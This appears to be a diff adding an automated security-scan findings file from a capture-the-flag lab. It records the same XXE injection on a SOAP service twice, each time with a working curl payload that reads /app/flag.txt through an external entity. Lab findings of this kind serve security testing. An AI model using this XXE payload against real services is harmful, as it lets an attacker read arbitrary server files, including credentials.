@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:27:32.277728+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "90a9bd37-ea8e-4581-a2f4-82311bd27157",
+      "timestamp": "2026-04-14T15:27:32.277623+00:00",
+      "title": "XXE Injection in SOAP Service - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:56811/soap_service",
+      "description": "The /soap_service endpoint is vulnerable to XML External Entity (XXE) injection. By crafting a malicious XML payload with a SYSTEM entity referencing a local file, an attacker can read arbitrary files from the server filesystem.",
+      "evidence": "flag{0abbab82-7e17-488e-8c06-c413564d6d4a}",
+      "tool_used": "curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:56811/soap_service -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'",
+        "expected": "Response contains file contents in account_id field"
+      }
+    },
+    {
+      "id": "056c824a-c76e-47d2-b7fd-f236ccf034fe",
+      "timestamp": "2026-04-14T15:27:32.349106+00:00",
+      "title": "XXE Injection in SOAP Service - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:56811/soap_service",
+      "description": "The /soap_service endpoint is vulnerable to XML External Entity (XXE) injection. By crafting a malicious XML payload with a SYSTEM entity referencing a local file, an attacker can read arbitrary files from the server filesystem.",
+      "evidence": "flag{0abbab82-7e17-488e-8c06-c413564d6d4a}",
+      "tool_used": "curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:56811/soap_service -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'",
+        "expected": "Response contains file contents in account_id field"
+      }
+    }
+  ],
+  "diagrams": []
+}
